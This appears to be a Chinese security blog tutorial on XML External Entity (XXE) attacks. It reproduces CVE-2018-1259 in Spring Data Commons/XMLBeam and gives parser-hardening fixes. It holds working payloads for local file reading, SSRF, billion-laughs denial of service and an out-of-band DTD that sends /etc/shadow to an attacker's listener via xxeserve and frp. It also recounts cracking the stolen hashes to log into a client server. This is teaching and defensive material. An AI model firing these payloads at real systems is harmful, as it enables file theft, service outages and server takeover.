***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

**首先声明下本文为萌新向，旨在让刚接触XXE基本概念的小伙伴们可以熟练运用高阶的XXE攻击。本文涉及层面包括概念讲解、代码审计、漏洞复现、漏洞利用、工具使用、安全开发，无论你是开发人员还是渗透工程师，都可以在这里拿到你想要的。**

在渗透领域、XXE相对来讲入门门槛是偏高的，网上的各类XXE教程对于大牛还好，但对于一些零开发基础的小伙伴来讲，着实不太友好，所以我希望通过从最基础的理论着手，为大家建立一个健全易懂的XXE漏洞复现，结合代码审计，更好的帮助大家更好的攻克这个点。  

> 代码审计涉及漏洞：
>
> XML Entity Expansion Injection (XML实体扩展注入)
>
> XML External Entity Injection (XML外部实体注入)

## 基本概念  

在展开讲XXE之前，我们必须得了解些基础概念，因为本文重点为XXE，关于XML学习未提到的部分大家可以参照参考资料自我拓展。

### XML

XML 指可扩展标记语言（eXtensible Markup Language）。  
方便大家理解，这里与HTML对比着给大家说一下：HTML和XML 为不同的目的而设计，HTML 被设计用来显示数据，其焦点是数据的外观。XML
被设计用来传输和存储数据，其焦点是数据的内容。HTML 旨在显示信息，而 XML 旨在传输信息。

### DTD

DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。  
DTD的声明：指XML文档中声明该文档的DTD或DTD来源的部分，可以包含在使用它的XML文档内部，也可以以独立的DTD文档（*.dtd）文档存在。

所以DTD一般认为有两种引用或声明方式：

> 1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。  
> 2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。  
> （网上有提到的引用公共DTD其实也算外部引用DTD的一种）

### XML基本文档结构

    
    
    <!--XML声明-->
    <?xml version="1.0" encoding="UTF-8"?>
    <!--DTD，这部分可选的-->          
    <!DOCTYPE foo [ 
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >
    ]>
    <!--文档元素-->                                                                          
    <foo>&ampxxe</foo>
    

## XXE的复现

说起最近比较火的XXE，不得不提2018年出现的spring中出现的XXE漏洞【CVE-2018-1259】，今天就拿它来开刀吧。

> Spring Data Commons, versions 1.13 prior to 1.13.12 and 2.0 prior to 2.0.7,
> used in combination with XMLBeam 1.4.14 or earlier versions, contains a
> property binder vulnerability caused by improper restriction of XML external
> entity references as underlying library XMLBeam does not restrict external
> reference expansion. An unauthenticated remote malicious user can supply
> specially crafted request parameters against Spring Data's projection-based
> request payload binding to access arbitrary files on the system.

从官方的描述中我们可以看到，此漏洞主要出现在XMLbeam1.4.14之前的版本，同时要求Spring Data Commons
1.13至1.13.11以及2.0至2.0.6的版本，目前idea默认选择的spring boot2.1.1版本漏洞已修复，我们可以看到默认的Spring
Data Commons版本为2.1.0以上。

![image.png](https://image.3001.net/images/20190112/1547273113_5c3983997d90d.png!small)

spring boot默认库

![image.png](https://image.3001.net/images/20190112/1547273188_5c3983e47def9.png!small)

spring boot 2.1.1数据包报错

![image.png](https://image.3001.net/images/20190112/1547273197_5c3983ed0532d.png!small)

spring boot 2.1.1调试报错

显然，这是因为spring boot 2.1.1默认禁用了DTD。

我们尝试降低spring-data-commons版本，以便漏洞正常复现，直接修改pom文件，借助maven自动解决依赖问题。

![image.png](https://image.3001.net/images/20190112/1547273355_5c39848ba6d9b.png!small)

配置pom文件

在这里说点经验之谈，我对不同版本进行了尝试，不知道是不是个人原因，我发现版本并没有按照官方提到的那样精确，比如这里如果spring-data-commons采用2.0.6版本， XMLBeam采用1.4.13版本，你会发现DTD依然是被禁止的。所以本次漏洞复现我选择了spring-data-commons2.0.6+ XMLBeam1.4.14的组合。

然后我们在springboot中简单的写个小功能，操作过程打算使用burpsuite复现，那就不写前端页面啦~

核心代码如下，用来接收通过XML提交的两个数据：firstname/lastname

    
    
    public interface UserPayload {
    
            @XBRead("//firstname")
            @JsonPath("$..firstname")
            String getFirstname();
    
            @XBRead("//lastname")
            @JsonPath("$..lastname")
            String getLastname();
        }
    

springboot不愧为新一代的懒人框架，简单的调整下入口文件，小程序完美启动~

![image.png](https://image.3001.net/images/20190112/1547273417_5c3984c9219ea.png!small)

完美启动

我们先来构造一个正常的XML文档~

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <user><firstname>rabbit</firstname><lastname>666</lastname></user>
    

![image.png](https://image.3001.net/images/20190112/1547273442_5c3984e20c2b6.png!small)

程序正常，over

然后我们来构造一个引用特殊的payload，增加DTD，为了演示效果，我们在C盘下新建一个txt文件。

    
    
    <?xml version="1.0" encoding="UTF-8"?>        
    <!DOCTYPE foo [ 
    <!ELEMENT foo ANY >
    <!ENTITY rabbit SYSTEM "file:///c:/1.txt" >
    ]>
    <user><firstname>&amprabbit</firstname><lastname>666</lastname></user>
    

![image.png](https://image.3001.net/images/20190112/1547273476_5c39850437af1.png!small)

实现访问资源

试着来访问下系统文件：

    
    
    <?xml version="1.0" encoding="UTF-8"?>        
    <!DOCTYPE foo [ 
    <!ELEMENT foo ANY >
    <!ENTITY rabbit SYSTEM "file:///c:/windows/win.ini" >
    ]>
    <user><firstname>&amprabbit</firstname><lastname>666</lastname></user>

![image.png](https://image.3001.net/images/20190112/1547273498_5c39851a47596.png!small)

访问系统文件

## XXE的利用

这时候，我们不禁要问了，XXE漏洞究竟能用来做什么？

### 任意文件读取

这里，我们就不重复了，说到底，这是XXE最基本的使用方式，我们上面也一直体现了这一点。

### SSRF

SSRF(Server-Side Request
Forgery:服务器端请求伪造)，说白了就是借助漏洞实现内网探测，我在80端口的网站下临时放了我们刚刚的测试文件，简单修改下payload：

    
    
    <?xml version="1.0" encoding="UTF-8"?>        
    <!DOCTYPE foo [ 
    <!ELEMENT foo ANY >
    <!ENTITY rabbit SYSTEM "http://127.0.0.1/1.txt" >
    ]>
    <user><firstname>&amprabbit</firstname><lastname>666</lastname></user>
    

当然啦，这里的127.0.0.1可以替换成任意你想要的内网地址，我们就可以借此实现对内网的探测。

![image.png](https://image.3001.net/images/20190112/1547273567_5c39855f39996.png!small)

SSRF

### DOS攻击

看到这里会不会虎躯一震，这丫怎么会？继续看

    
    
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
      <!ENTITY lol "lol">
      <!ENTITY lol2 "&amplol&amplol&amplol&amplol&amplol&amplol&amplol&amplol&amplol&amplol">
      <!ENTITY lol3 "&amplol2&amplol2&amplol2&amplol2&amplol2&amplol2&amplol2&amplol2&amplol2&amplol2">
      <!ENTITY lol4 "&amplol3&amplol3&amplol3&amplol3&amplol3&amplol3&amplol3&amplol3&amplol3&amplol3">
      <!ENTITY lol5 "&amplol4&amplol4&amplol4&amplol4&amplol4&amplol4&amplol4&amplol4&amplol4&amplol4">
      <!ENTITY lol6 "&amplol5&amplol5&amplol5&amplol5&amplol5&amplol5&amplol5&amplol5&amplol5&amplol5">
      <!ENTITY lol7 "&amplol6&amplol6&amplol6&amplol6&amplol6&amplol6&amplol6&amplol6&amplol6&amplol6">
      <!ENTITY lol8 "&amplol7&amplol7&amplol7&amplol7&amplol7&amplol7&amplol7&amplol7&amplol7&amplol7">
      <!ENTITY lol9 "&amplol8&amplol8&amplol8&amplol8&amplol8&amplol8&amplol8&amplol8&amplol8&amplol8">
    ]>
    <lolz>&amplol9</lolz>
    

此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。  
亦或者，如果目标是UNIX系统，

    
    
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ 
      <!ELEMENT foo ANY >
      <!ENTITY xxe SYSTEM "file:///dev/random" >]>
    <foo>&ampxxe</foo>
    

如果 XML 解析器尝试使用 /dev/random 文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。

### 远程命令执行

这种情况很少见，并不是传统意义上的任意命令执行，只是因为环境的特殊配置，导致XML与某些命令操作关联，进而造成了命令执行。当PHP环境中的PHP
expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，就会造成我们说的这种情况，在这里，我们不做展开讲解。

## 修复建议

对 XML 解析器进行安全配置，使它不允许将外部实体包含在传入的 XML
文档中。不管是上面语言，抑或是使用了市面是哪种主流XML解析方案，最终的解决方案都可以如此借鉴：  
为了避免 XXE injections，应为 XML 代理、解析器或读取器设置下面的属性：

    
    
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    

如果不需要 inline DOCTYPE
声明，可使用以下属性将其完全禁用，这种方式显然更直接，我们搭建环境中一直在吐槽DTD被禁用，就是这个意思，DOCTYPE被禁，也就禁掉了DTD的根本：

    
    
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    

说到这里你可能会突然提到一个问题，emmmm，那XMLbeam的XXE漏洞是如何修复的呢？  
我给大家找到了XMLbeam1.4.14和1.4.15中的createDocumentBuilderFactory（）函数方便大家做下对比：

![image.png](https://image.3001.net/images/20190112/1547273687_5c3985d7e4c64.png!small)

配置文件路径

    
    
    #####1.4.14
        public DocumentBuilderFactory createDocumentBuilderFactory() {
            DocumentBuilderFactory instance = DocumentBuilderFactory.newInstance();
            if (!DefaultXMLFactoriesConfig.NamespacePhilosophy.AGNOSTIC.equals(this.namespacePhilosophy)) {
                instance.setNamespaceAware(DefaultXMLFactoriesConfig.NamespacePhilosophy.HEDONISTIC.equals(this.namespacePhilosophy));
            }
    
            return instance;
        }
    
    
    
    #####1.4.15
        public DocumentBuilderFactory createDocumentBuilderFactory() {
            DocumentBuilderFactory instance = DocumentBuilderFactory.newInstance();
            instance.setXIncludeAware(this.isXIncludeAware);
            instance.setExpandEntityReferences(this.isExpandEntityReferences);
            if (!DefaultXMLFactoriesConfig.NamespacePhilosophy.AGNOSTIC.equals(this.namespacePhilosophy)) {
                instance.setNamespaceAware(DefaultXMLFactoriesConfig.NamespacePhilosophy.HEDONISTIC.equals(this.namespacePhilosophy));
            }
    
            return instance;
        }

后者设置了新的方法用于禁用DTD。

我们顺便去找下官方提供的漏洞升级补丁，以方便理解。

> 下载地址：<https://pan.baidu.com/s/161gWHgR6Dc7A-eSWe39ikg>

然后我们在第106行处会看到如下配置，正是我们刚刚提到的解决方案。

    
    
        private static final String NON_EXISTING_URL = "http://xmlbeam.org/nonexisting_namespace";
        private static final String[] FEATURE_DEFAULTS = new String[] { "http://apache.org/xml/features/disallow-doctype-decl#true", //
                "http://xml.org/sax/features/external-general-entities#false", //
                "http://xml.org/sax/features/external-parameter-entities#false", //
                "http://apache.org/xml/features/nonvalidating/load-external-dtd#false" };

## XXE进阶

我们通过之前的讲解，大家可以稍微总结一下，要想实现XXE，基本上要具备两个条件：1、支持DTD，2、数据可操控

前者是我们xxe的必须条件，暂且不谈，但后者如果我们提交的数据并未通过返回包返回回来，我们也就看不到了。

对于这种数据无回显的情况，我们引出OOB攻击的概念，即数据外带（Out of Band）。

我们可以像网上相关教程那样，通过自己写一个页面用来接受目标服务器传回的内容，但是实际测试效果并不稳定，在此本着萌新向、能懒则懒的正统思想给大家安利一个开源工具：xxeserve

> <https://github.com/joernchen/xxeserve>

刚好最近项目碰上个非常好的实例，请原谅我打了厚厚的马赛克来表达对客户的尊重。

下图是一个网站的登录窗口，随便尝试登录一下，发现用户名密码采用xml的格式进行上传。  

我们对登陆功能进行测试，尝试了下DTD，发现没有被禁掉！行动！

![image.png](https://image.3001.net/images/20190112/1547275093_5c398b556541a.png!small)

今日demo

我们使用正常逻辑进行尝试！发现返回包并没有存在可供我们操纵的任何数据。

![image.png](https://image.3001.net/images/20190112/1547275165_5c398b9d320a1.png!small)

正常逻辑

那么，这里我们的想法就是：服务器既然无法给我们回显数据，我们能不能尝试将已构造好的参数，通过例如HTTP的方式返回到我们看得到的地方？

于是，开始我们的OOB攻击！

xxeserve是基于ruby开发的，如果懒于自己搭建ruby runingtime，那就丢了parrotsec / kali上吧。  

这里还有一个问题，就是我们的PC处于内网环境，如何正常接受返回的数据呢？

frp反向代理完美解决了我们的顾虑。

    
    
    #frpc.ini
    [xxe]
    type = tcp
    local_ip = 127.0.0.1
    local_port = 2333
    remote_port = 2333
    
    
    
    #DTD
    <!DOCTYPE root [<!ENTITY % remote SYSTEM "http://*.*.*.*:2333/xml?f=/etc/shadow">%remote;%int;%trick;]>
    

运行xxeserve，在指定端口进行监听：

![image.png](https://image.3001.net/images/20190112/1547275343_5c398c4f0d5fb.png!small)

xxeserve

发送构造好的payload，虽然发现xml解析错误的提示：

![image.png](https://image.3001.net/images/20190112/1547275389_5c398c7da5c5e.png!small)

发送payload

但是，xxeserve却成功监听到了我们想要读取的文件，如图中的用户hash：

![image.png](https://image.3001.net/images/20190112/1547275415_5c398c97aa443.png!small)

xxeserve监听

如果你要问这个漏洞有多么可怕。

emmmmm，我们只是看到一个网站的登录界面，然后在其它什么也不知道的情况下，可以直接任意读取该服务器上文件，如passwd、shadow等。

当然，此次项目中我们直接读取到用户hash并成功解密，直接登录了该服务器，可谓顺利。

 ***本文作者：rabbitmask，本文属 FreeBuf原创奖励计划，未经许可禁止转载。**

